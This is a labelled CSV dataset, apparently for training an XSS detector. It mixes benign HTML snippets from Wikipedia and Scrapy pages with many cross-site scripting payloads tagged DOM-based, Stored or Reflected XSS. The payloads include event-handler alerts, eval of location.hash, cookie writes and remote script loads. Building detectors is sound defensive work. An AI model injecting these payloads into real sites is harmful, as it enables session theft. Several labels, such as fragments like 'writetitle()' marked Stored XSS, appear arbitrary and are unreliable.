Sentence,Final_Label
"<script>var url = document.URL; document.getElementById(""test"").innerHTML=url;</script>",DOM-based XSS
<svg><image href=validimage.png onload=alert(1)>,Stored XSS
"<svg onbeforecut=""alert(1)"" contenteditable>test</svg>",Stored XSS
"<li><a href=""/wiki/Machine_translation"" title=""Machine translation"">Machine translation </a> </li>",Normal
"<svg draggable=""true"" ondragenter=""alert(1)"">test</svg>",Stored XSS
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
"<svg onmouseover=""alert(1)"">test</svg>",Stored XSS
<svg><param onload=alert(1)></param>,Stored XSS
<script>eval(document.location.hash.substring(1));</script>,DOM-based XSS
"<li id=""cite_note-57""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-57"">^ </a> </b> ",Normal
"<ol oncontextmenu=""alert(1)"">test</ol>",Reflected XSS
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
<option id=x tabindex=1 onbeforeactivate=alert(1)></option>,Reflected XSS
<big id=x tabindex=1 onfocus=alert(1)></big>,Reflected XSS
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
<script>var input = window.location.search; document.body.innerHTML = input;</script>,DOM-based XSS
"<script>var data = document.referrer; document.getElementById(""demo"").innerHTML=data;</script>",DOM-based XSS
<animatemotion onpointerout=alert(1)>XSS</animatemotion>,Reflected XSS
<script>eval(document.location.hash.substring(1));</script>,DOM-based XSS
"<style>:target {color:red;}</style><script id=x style=""transition:color 1s"" ontransitionend=alert(1)></script>",Stored XSS
<svg><area onload=alert(1)></area>,Stored XSS
"<aside onbeforecopy=""alert(1)"" contenteditable>test</aside>",Reflected XSS
"<iframe onbeforecopy=""alert(1)"" contenteditable>test</iframe>",Stored XSS
<svg onpointerup=alert(1)>XSS</svg>,Stored XSS
"<style>:target {transform: rotate(180deg);}</style><table id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></table>",Reflected XSS
"<div class=""thumb tright"">",Normal
"<p class=""caption""><span class=""caption-text"">All the rest",Normal
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
<col id=x tabindex=1 ondeactivate=alert(1)></col><input id=y autofocus>,Reflected XSS
"<button onmousemove=""alert(1)"">test</button>",Reflected XSS
"<iframe onbeforecut=""alert(1)"" contenteditable>test</iframe>",Stored XSS
"<dt><a class=""reference internal"" href=""topics/autothrottle.html""><span class=""doc"">AutoThrottle extension",Normal
<svg><thead onload=alert(1)></thead>,Stored XSS
<svg><picture onload=alert(1)></picture>,Stored XSS
"<style>:target {color:red;}</style><embed id=x style=""transition:color 1s"" ontransitionend=alert(1)></embed>",Stored XSS
"<script>document.getElementById(""output"").innerHTML = location.hash.substring(1);</script>",DOM-based XSS
          <footer>,Normal
"<iframe onmouseup=""alert(1)"">test</iframe>",Stored XSS
"<hgroup onbeforepaste=""alert(1)"" contenteditable>test</hgroup>",Reflected XSS
"	 <div style=""padding:0em 0.25em"">",Normal
"<style>:target {color:red;}</style><blink id=x style=""transition:color 1s"" ontransitionend=alert(1)></blink>",Reflected XSS
writetitle(),Stored XSS
"<dd>Much of what people know is not represented as ""facts"" or ""statements"" that they could express verbally. For example, a chess master will avoid a particular chess position because it ""feels too exposed""<sup id=""cite_ref-FOOTNOTEDreyfusDreyfus1986_107-0"" class=""reference""><a href=""#cite_note-FOOTNOTEDreyfusDreyfus1986-107"">&#91;104&#93; </a> </sup> or an art critic can take one look at a statue and realize that it is a fake.<sup id=""cite_ref-FOOTNOTEGladwell2005_108-0"" class=""reference""><a href=""#cite_note-FOOTNOTEGladwell2005-108"">&#91;105&#93; </a> </sup> These are non-conscious and sub-symbolic intuitions or tendencies in the human brain.<sup id=""cite_ref-Intuition_109-0"" class=""reference""><a href=""#cite_note-Intuition-109"">&#91;106&#93; </a> </sup> Knowledge like this informs, supports and provides a context for symbolic, conscious knowledge. As with the related problem of sub-symbolic reasoning, it is hoped that <a href=""/wiki/Situated_artificial_intelligence"" class=""mw-redirect"" title=""Situated artificial intelligence"">situated AI </a>, <a href=""/wiki/Computational_intelligence"" title=""Computational intelligence"">computational intelligence </a>, or <a href=""#Statistical"">statistical AI </a> will provide ways to represent this kind of knowledge.<sup id=""cite_ref-Intuition_109-1"" class=""reference""><a href=""#cite_note-Intuition-109"">&#91;106&#93; </a> </sup> </dd> </dl>",Normal
"<var oncut=""alert(1)"" contenteditable>test</var>",Reflected XSS
"<li><a href=""/wiki/Distributed_artificial_intelligence"" title=""Distributed artificial intelligence"">Distributed artificial intelligence </a> </li> </ul>",Normal
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
<svg onpointerdown=alert(1)>XSS</svg>,Stored XSS
 </li>,Normal
"<script>var url = document.URL; document.getElementById(""test"").innerHTML=url;</script>",DOM-based XSS
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
"<figcaption draggable=""true"" ondragleave=""alert(1)"">test</figcaption>",Reflected XSS
"<q draggable=""true"" ondragenter=""alert(1)"">test</q>",Reflected XSS
"<li><a href=""/wiki/Semantic_Web"" title=""Semantic Web"">Semantic Web </a><span class=""nowrap"">&#160; ",Normal
Prematurity of:,Normal
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
<svg><select onload=alert(1)></select>,Stored XSS
 </li>,Normal
<svg><animate onbegin=alert(1) attributeName=x dur=1s>,Stored XSS
<svg><map onload=alert(1)></map>,Stored XSS
	 </span> </a> </li>,Normal
<script>var input = window.location.search; document.body.innerHTML = input;</script>,DOM-based XSS
<nextid id=x tabindex=1 onfocusin=alert(1)></nextid>,Reflected XSS
"<li><a href=""/wiki/Evolutionary_data_mining"" title=""Evolutionary data mining"">Evolutionary data mining </a> </li>",Normal
<svg><animate onend=alert(1) attributeName=x dur=1s>,Stored XSS
"<rt onbeforepaste=""alert(1)"" contenteditable>test</rt>",Reflected XSS
"<object onmousedown=""alert(1)"">test</object>",Stored XSS
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
<svg><span onload=alert(1)></span>,Stored XSS
"<li class=""toclevel-2 tocsection-39""><a href=""#Cybersecurity""><span class=""tocnumber"">7.4 ",Normal
"<script>var url = document.URL; document.getElementById(""test"").innerHTML=url;</script>",DOM-based XSS
"<script>var data = document.referrer; document.getElementById(""demo"").innerHTML=data;</script>",DOM-based XSS
"<script oncut=""alert(1)"" contenteditable>test</script>",Stored XSS
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",Normal
"<iframe oncut=""alert(1)"" contenteditable>test</iframe>",Stored XSS
<embed id=x tabindex=1 onbeforeactivate=alert(1)></embed>,Stored XSS
"<object draggable=""true"" ondragenter=""alert(1)"">test</object>",Stored XSS
<svg><bgsound onload=alert(1)></bgsound>,Stored XSS
"<div draggable=""true"" contenteditable>drag me</div><figcaption ondragover=alert(1) contenteditable>drop here</figcaption>",Reflected XSS
"<svg onclick=""alert(1)"">test</svg>",Stored XSS
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
"<ul><li><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, pp.&#160;454–462 </li>",Normal
"<strike oncopy=""alert(1)"" contenteditable>test</strike>",Reflected XSS
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
"<ul><li><a href=""/wiki/Computer_architecture"" title=""Computer architecture"">Computer architecture </a> </li>",Normal
"SRC=""test.xml"" ID=I",Stored XSS
<script>eval(document.location.hash.substring(1));</script>,DOM-based XSS
<blockquote onpointerenter=alert(1)>XSS</blockquote>,Reflected XSS
<shadow onblur=alert(1) tabindex=1 id=x></shadow><input autofocus>,Reflected XSS
"<li><a href=""/wiki/Inference_engine"" title=""Inference engine"">Inference engine </a> </li>",Normal
<svg><wbr onload=alert(1)></wbr>,Stored XSS
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
	 </span> </a>,Normal
"<th onmouseup=""alert(1)"">test</th>",Reflected XSS
"<LINK REL=""stylesheet"" HREF=""http://.rocks/.css"">",Stored XSS
<area onpointerout=alert(1)>XSS</area>,Reflected XSS
"<iframe onkeypress=""alert(1)"" contenteditable>test</iframe>",Stored XSS
"<rb draggable=""true"" ondragenter=""alert(1)"">test</rb>",Reflected XSS
<svg><animate onbegin=alert(1) attributeName=x dur=1s>,Stored XSS
<embed onpointerout=alert(1)>XSS</embed>,Stored XSS
<svg onpointermove=alert(1)>XSS</svg>,Stored XSS
<script onreadystatechange=alert(1)></script>,Stored XSS
"<li id=""cite_note-Ontology-98""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Ontology_98-0"">^ </a> </b> ",Normal
	 </span></a></dt><dd>Extract the data from web pages using XPath.</dd>,Normal
"<dt><a class=""reference internal"" href=""topics/contracts.html""><span class=""doc"">Spiders Contracts",Normal
"<rtc onclick=""alert(1)"">test</rtc>",Reflected XSS
A few of the people who make some form of the argument:,Normal
<svg><b onload=alert(1)></b>,Stored XSS
 </p>,Normal
"<script>var data = document.referrer; document.getElementById(""demo"").innerHTML=data;</script>",DOM-based XSS
"<p>Much of traditional <a href=""/wiki/Symbolic_artificial_intelligence"" title=""Symbolic artificial intelligence"">GOFAI </a> got bogged down on <i>ad hoc </i> patches to <a href=""/wiki/Symbolic_computation"" class=""mw-redirect"" title=""Symbolic computation"">symbolic computation </a> that worked on their own toy models but failed to generalize to real-world results. However, around the 1990s, AI researchers adopted sophisticated mathematical tools, such as <a href=""/wiki/Hidden_Markov_model"" title=""Hidden Markov model"">hidden Markov models </a> (HMM), <a href=""/wiki/Information_theory"" title=""Information theory"">information theory </a>, and normative Bayesian <a href=""/wiki/Decision_theory"" title=""Decision theory"">decision theory </a> to compare or to unify competing architectures. The shared mathematical language permitted a high level of collaboration with more established fields (like <a href=""/wiki/Mathematics"" title=""Mathematics"">mathematics </a>, economics or <a href=""/wiki/Operations_research"" title=""Operations research"">operations research </a>).<sup id=""cite_ref-174"" class=""reference""><a href=""#cite_note-174"">&#91;d&#93; </a> </sup> Compared with GOFAI, new ""statistical learning"" techniques such as HMM and neural networks were gaining higher levels of accuracy in many practical domains such as <a href=""/wiki/Data_mining"" title=""Data mining"">data mining </a>, without necessarily acquiring a semantic understanding of the datasets. The increased successes with real-world data led to increasing emphasis on comparing different approaches against shared test data to see which approach performed best in a broader context than that provided by idiosyncratic toy models; AI research was becoming more <a href=""/wiki/Scientific_method"" title=""Scientific method"">scientific </a>. Nowadays results of experiments are often rigorously measurable, and are sometimes (with difficulty) reproducible.<sup id=""cite_ref-Formal_methods_in_AI_43-1"" class=""reference""><a href=""#cite_note-Formal_methods_in_AI-43"">&#91;43&#93; </a> </sup><sup id=""cite_ref-175"" class=""reference""><a href=""#cite_note-175"">&#91;171&#93; </a> </sup> Different statistical learning techniques have different limitations; for example, basic HMM cannot model the infinite possible combinations of natural language.<sup id=""cite_ref-FOOTNOTENorvig2012_176-0"" class=""reference""><a href=""#cite_note-FOOTNOTENorvig2012-176"">&#91;172&#93; </a> </sup> Critics note that the shift from GOFAI to statistical learning is often also a shift away from <a href=""/wiki/Explainable_AI"" class=""mw-redirect"" title=""Explainable AI"">explainable AI </a>. In AGI research, some scholars caution against over-reliance on statistical learning, and argue that continuing research into GOFAI will still be necessary to attain general intelligence.<sup id=""cite_ref-FOOTNOTELangley2011_177-0"" class=""reference""><a href=""#cite_note-FOOTNOTELangley2011-177"">&#91;173&#93; </a> </sup><sup id=""cite_ref-FOOTNOTEKatz2012_178-0"" class=""reference""><a href=""#cite_note-FOOTNOTEKatz2012-178"">&#91;174&#93; </a> </sup>",Normal
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
<svg><cite onload=alert(1)></cite>,Stored XSS
"<ul><li><a href=""/wiki/Metaphysics"" title=""Metaphysics"">Metaphysics </a> </li>",Normal
<picture onpointerover=alert(1)>XSS</picture>,Reflected XSS
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
"<style>:target {color: red;}</style><menu id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></menu>",Reflected XSS
<embed id=x onfocusin=alert(1) type=text/html>,Stored XSS
"<li><a href=""/wiki/Auguste_Comte"" title=""Auguste Comte"">Auguste Comte </a> </li>",Normal
<address id=x tabindex=1 onbeforedeactivate=alert(1)></address><input autofocus>,Reflected XSS
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><svg id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></svg>",Stored XSS
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
"<rt onmouseout=""alert(1)"">test</rt>",Reflected XSS
"<style>:target {color: red;}</style><mark id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></mark>",Reflected XSS
<script>eval(document.location.hash.substring(1));</script>,DOM-based XSS
<svg><nav onload=alert(1)></nav>,Stored XSS
	 </span> ,Normal
"<label onbeforepaste=""alert(1)"" contenteditable>test</label>",Reflected XSS
<form id=x tabindex=1 onfocusin=alert(1)></form>,Reflected XSS
"<li><a href=""/wiki/New_mysterianism"" title=""New mysterianism"">New mysterianism </a> </li>",Normal
<SCRIPT>alert('');</SCRIPT>,Stored XSS
"<table ondblclick=""alert(1)"">test</table>",Reflected XSS
"setTimeout(\\""writetitle()\\"",$\_GET\[\])",Stored XSS
<ul>,Normal
<svg><nextid onload=alert(1)></nextid>,Stored XSS
"<li><a href=""/wiki/Evolutionary_data_mining"" title=""Evolutionary data mining"">Evolutionary data mining </a> </li>",Normal
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
<svg><animate onend=alert(1) attributeName=x dur=1s>,Stored XSS
"<colgroup onmouseout=""alert(1)"">test</colgroup>",Reflected XSS
"<blockquote onbeforepaste=""alert(1)"" contenteditable>test</blockquote>",Reflected XSS
"<embed onbeforecopy=""alert(1)"" contenteditable>test</embed>",Stored XSS
<svg onpointerleave=alert(1)>XSS</svg>,Stored XSS
"<style>:target {color: red;}</style><embed id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></embed>",Stored XSS
"<script>var data = document.referrer; document.getElementById(""demo"").innerHTML=data;</script>",DOM-based XSS
"<svg onmouseleave=""alert(1)"">test</svg>",Stored XSS
<object id=x onfocus=alert(1) type=text/html>,Stored XSS
"<SPAN DATASRC=""#"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN>",Stored XSS
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",Normal
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
<script>eval(document.location.hash.substring(1));</script>,DOM-based XSS
"<li><a href=""/wiki/Memetic_algorithm"" title=""Memetic algorithm"">Memetic algorithm </a> </li> </ul>",Normal
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
 ,Normal
<SCRIPT>alert('');</SCRIPT>,Stored XSS
"<li><a href=""#CITEREFCrevier1993"">Crevier 1993 </a>, pp.&#160;209–210 </li>",Normal
<script>eval(document.location.hash.substring(1));</script>,DOM-based XSS
<style onload=alert(1)></style>,Reflected XSS
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
"<dt><a class=""reference internal"" href=""intro/overview.html""><span class=""doc"">Scrapy at a glance",Normal
"<li><a href=""/wiki/Genetic_operators"" class=""mw-redirect"" title=""Genetic operators"">Genetic operators </a> </li>",Normal
<body onbeforeprint=alert(1)>,Reflected XSS
<svg><bgsound onload=alert(1)></bgsound>,Stored XSS
<svg><em onload=alert(1)></em>,Stored XSS
"<li><a href=""/wiki/Computer_vision"" title=""Computer vision"">Computer vision </a> </li>",Normal
<mark id=x tabindex=1 onbeforeactivate=alert(1)></mark>,Reflected XSS
<script>var hash = location.hash; eval(hash.substring(1));</script>,DOM-based XSS
	 </span> </li>,Normal
"<nextid onbeforepaste=""alert(1)"" contenteditable>test</nextid>",Reflected XSS
<script>eval(document.location.hash.substring(1));</script>,DOM-based XSS
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=69"" title=""Edit section: In fiction"">edit </a><span class=""mw-editsection-bracket"">] ",Normal
 </li>,Normal
"<isindex onmousemove=""alert(1)"">test</isindex>",Reflected XSS
"<li id=""cite_note-304""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-304"">^ </a> </b> ",Normal
<wbr onpointerleave=alert(1)>XSS</wbr>,Reflected XSS
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
"<hr draggable=""true"" ondragstart=""alert(1)"">test</hr>",Reflected XSS
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
<svg><bgsound onload=alert(1)></bgsound>,Stored XSS
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",Normal
<script onpointerout=alert(1)>XSS</script>,Stored XSS
"<Input value = """" type = text>",Stored XSS
"<embed onkeypress=""alert(1)"" contenteditable>test</embed>",Stored XSS
"<time draggable=""true"" ondragstart=""alert(1)"">test</time>",Reflected XSS
"	 <div style=""padding:0em 0.25em"">",Normal
<rtc id=x tabindex=1 onfocusin=alert(1)></rtc>,Reflected XSS
"      <div class=""wy-nav-content"">",Normal
<script>eval(document.location.hash.substring(1));</script>,DOM-based XSS
"<script>document.getElementById(""output"").innerHTML = location.hash.substring(1);</script>",DOM-based XSS
"<ul><li><a href=""/wiki/Neurophenomenology"" title=""Neurophenomenology"">Neurophenomenology </a> </li> </ul> </li>",Normal
<svg onpointerover=alert(1)>XSS</svg>,Stored XSS
<svg><figure onload=alert(1)></figure>,Stored XSS
<SCRIPT>alert('');</SCRIPT>,Stored XSS
 ,Normal
"<object onkeyup=""alert(1)"" contenteditable>test</object>",Stored XSS
"<td onmouseenter=""alert(1)"">test</td>",Reflected XSS
"<summary onpaste=""alert(1)"" contenteditable>test</summary>",Reflected XSS
 </li>,Normal
"<embed onbeforecopy=""alert(1)"" contenteditable>test</embed>",Stored XSS
"<nobr onmouseenter=""alert(1)"">test</nobr>",Reflected XSS
"<script>var url = document.URL; document.getElementById(""test"").innerHTML=url;</script>",DOM-based XSS
"	 </span> <span class=""reference-text"">",Normal
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
"<svg onclick=""alert(1)"">test</svg>",Stored XSS
"	 </span> <span class=""toctext"">Technological singularity ",Normal
<thead onpointerenter=alert(1)>XSS</thead>,Reflected XSS
"<script>document.getElementById(""output"").innerHTML = location.hash.substring(1);</script>",DOM-based XSS
"<audio oncanplay=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",Reflected XSS
<tfoot id=x tabindex=1 ondeactivate=alert(1)></tfoot><input id=y autofocus>,Reflected XSS
"<ul><li><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, pp.&#160;243–252 </li>",Normal
"<li id=""cite_note-370""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-370"">^ </a> </b> ",Normal
<col onfocusout=alert(1) tabindex=1 id=x></col><input autofocus>,Reflected XSS
"<script>var data = document.referrer; document.getElementById(""demo"").innerHTML=data;</script>",DOM-based XSS
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
 </li>,Normal
"<object onpaste=""alert(1)"" contenteditable>test</object>",Stored XSS
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",Normal
"<fieldset oncut=""alert(1)"" contenteditable>test</fieldset>",Reflected XSS
"<code draggable=""true"" ondragenter=""alert(1)"">test</code>",Reflected XSS
<svg><bdi onload=alert(1)></bdi>,Stored XSS
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
"<script onmouseup=""alert(1)"">test</script>",Stored XSS
"<li><a href=""#CITEREFPooleMackworthGoebel1998"">Poole, Mackworth &amp; Goebel 1998 </a>, pp.&#160;345–395, </li>",Normal
"<li><cite id=""CITEREFLucas1961"" class=""citation book""><a href=""/wiki/John_Lucas_(philosopher)"" title=""John Lucas (philosopher)"">Lucas, John </a> (1961). ""Minds, Machines and Gödel"".  In Anderson, A.R. (ed.). <a rel=""nofollow"" class=""external text"" href=""http://users.ox.ac.uk/~jrlucas/Godel/mmg.html""><i>Minds and Machines </i> </a>. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20070819165214/http://users.ox.ac.uk/~jrlucas/Godel/mmg.html"">Archived </a> from the original on 19 August 2007<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">30 August ",Normal
"<form><a href=""javascript:\u0061lert(1)"">X",Stored XSS
"<li><a href=""/wiki/Distributed_computing"" title=""Distributed computing"">Distributed computing </a> </li>",Normal
"setTimeout(\\""writetitle()\\"",$\_GET\[\])",Stored XSS
"<script>var url = document.URL; document.getElementById(""test"").innerHTML=url;</script>",DOM-based XSS
"<A HREF=""http://google:ha.ckers.org""></A>",Stored XSS
"<col onmouseenter=""alert(1)"">test</col>",Reflected XSS
"<ul><li><a href=""#CITEREFACM1998"">ACM 1998 </a>, I.2.10 </li>",Normal
<svg><dir onload=alert(1)></dir>,Stored XSS
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
<svg onblur=alert(1) tabindex=1 id=x></svg><input autofocus>,Stored XSS
"<li><a href=""/wiki/Data_mining"" title=""Data mining"">Data mining </a> </li>",Normal
<script onreadystatechange=alert(1)></script>,Stored XSS
"	 <sup id=""cite_ref-132"" class=""reference""><a href=""#cite_note-132"">&#91;129&#93; </a> </sup> ",Normal
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
<iframe onreadystatechange=alert(1)></iframe>,Stored XSS
"<script>  setTimeout(\\""writetitle()\\"",$\_GET\[\]) </script>",Stored XSS
	 </span> 2016 ,Normal
"<iframe ondblclick=""alert(1)"">test</iframe>",Stored XSS
"<script>var url = document.URL; document.getElementById(""test"").innerHTML=url;</script>",DOM-based XSS
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
"<ul><li><a href=""#CITEREFACM1998"">ACM 1998 </a>, I.2.4, </li>",Normal
<custom tags onpointerout=alert(1)>XSS</custom tags>,Reflected XSS
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
"<ul><li><a href=""/wiki/Type_physicalism"" title=""Type physicalism"">identity theory </a> </li> </ul> </li>",Normal
<svg><dfn onload=alert(1)></dfn>,Stored XSS
"<SCRIPT/SRC=""http://.rocks/.js""></SCRIPT>",Stored XSS
<output onpointerout=alert(1)>XSS</output>,Reflected XSS
"<style>:target {transform: rotate(180deg);}</style><iframe id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></iframe>",Stored XSS
<script>var hash = location.hash; eval(hash.substring(1));</script>,DOM-based XSS
"<script>document.getElementById(""output"").innerHTML = location.hash.substring(1);</script>",DOM-based XSS
<script>var hash = location.hash; eval(hash.substring(1));</script>,DOM-based XSS
"<li><a href=""/wiki/Philosophy_of_biology"" title=""Philosophy of biology"">Biology </a> </li>",Normal
"<iframe draggable=""true"" ondragstart=""alert(1)"">test</iframe>",Stored XSS
"<shadow onmouseover=""alert(1)"">test</shadow>",Reflected XSS
"<style>:target {color:red;}</style><th id=x style=""transition:color 1s"" ontransitionend=alert(1)></th>",Reflected XSS
<svg><table onload=alert(1)></table>,Stored XSS
<script>var input = window.location.search; document.body.innerHTML = input;</script>,DOM-based XSS
"<li><a href=""/wiki/Entertainment_robot"" title=""Entertainment robot"">Entertainment </a> </li>",Normal
"<video oncontextmenu=""alert(1)"">test</video>",Reflected XSS
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
<svg><small onload=alert(1)></small>,Stored XSS
<embed onpointerdown=alert(1)>XSS</embed>,Stored XSS
"<footer onmouseout=""alert(1)"">test</footer>",Reflected XSS
"<nobr onmousemove=""alert(1)"">test</nobr>",Reflected XSS
" </p><p>In 2019, the tech city of Bengaluru in India is set to deploy AI managed traffic signal systems across the 387 traffic signals in the city. This system will involve use of cameras to ascertain traffic density and accordingly calculate the time needed to clear the traffic volume which will determine the signal duration for vehicular traffic across streets.<sup id=""cite_ref-327"" class=""reference""><a href=""#cite_note-327"">&#91;316&#93; </a> </sup>",Normal
"	 <div class=""plainlinks hlist navbar mini""><ul><li class=""nv-view""><a href=""/wiki/Template:Philosophy_of_mind"" title=""Template:Philosophy of mind""><abbr title=""View this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">v </abbr> </a> </li><li class=""nv-talk""><a href=""/wiki/Template_talk:Philosophy_of_mind"" title=""Template talk:Philosophy of mind""><abbr title=""Discuss this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">t </abbr> </a> </li><li class=""nv-edit""><a class=""external text"" href=""https://en.wikipedia.org/w/index.php?title=Template:Philosophy_of_mind&amp;action=edit""><abbr title=""Edit this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">e </abbr> </a> </li> </ul> </div>",Normal
top[/al/.source+/ert/.source](1),Stored XSS
	 </span> </li>,Normal
"<IMG SRC='vbscript:msgbox("""")'>",Stored XSS
"<style>@keyframes slidein {}</style><embed style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></embed>",Stored XSS
<script>eval(document.location.hash.substring(1));</script>,DOM-based XSS
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
"<header onkeypress=""alert(1)"" contenteditable>test</header>",Reflected XSS
"<legend draggable=""true"" ondragstart=""alert(1)"">test</legend>",Reflected XSS
"<blockquote onbeforecut=""alert(1)"" contenteditable>test</blockquote>",Reflected XSS
<summary id=x tabindex=1 onfocusin=alert(1)></summary>,Reflected XSS
"<big onmousedown=""alert(1)"">test</big>",Reflected XSS
"<script>document.getElementById(""output"").innerHTML = location.hash.substring(1);</script>",DOM-based XSS
"<style>@keyframes slidein {}</style><figure style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></figure>",Reflected XSS
"<ul><li><a href=""#CITEREFMcCorduck2004"">McCorduck (2004 </a>, pp.&#160;190–25) discusses <i><a href=""/wiki/Frankenstein"" title=""Frankenstein"">Frankenstein </a> </i> and identifies the key ethical issues as scientific hubris and the suffering of the monster, i.e. <a href=""/wiki/Robot_rights"" class=""mw-redirect"" title=""Robot rights"">robot rights </a>. </li> </ul>",Normal
"<div draggable=""true"" contenteditable>drag me</div><element ondragover=alert(1) contenteditable>drop here</element>",Reflected XSS
"		<div id=""mw-content-text"" lang=""en"" dir=""ltr"" class=""mw-content-ltr"">",Normal
<svg id=x tabindex=1 ondeactivate=alert(1)></svg><input id=y autofocus>,Stored XSS
"<script draggable=""true"" ondragleave=""alert(1)"">test</script>",Stored XSS
	 </span>(1945) </li>,Normal
 </p>,Normal
<embed onpointermove=alert(1)>XSS</embed>,Stored XSS
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",Normal
<svg><multicol onload=alert(1)></multicol>,Stored XSS
"a=""get"";",Stored XSS
<script>var input = window.location.search; document.body.innerHTML = input;</script>,DOM-based XSS
<track id=x tabindex=1 ondeactivate=alert(1)></track><input id=y autofocus>,Reflected XSS
"	<a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=14"" title=""Edit section: Approaches"">edit </a><span class=""mw-editsection-bracket"">] ",Normal
"<b draggable=""true"" ondragenter=""alert(1)"">test</b>",Reflected XSS
<iframe id=x tabindex=1 onbeforeactivate=alert(1)></iframe>,Stored XSS
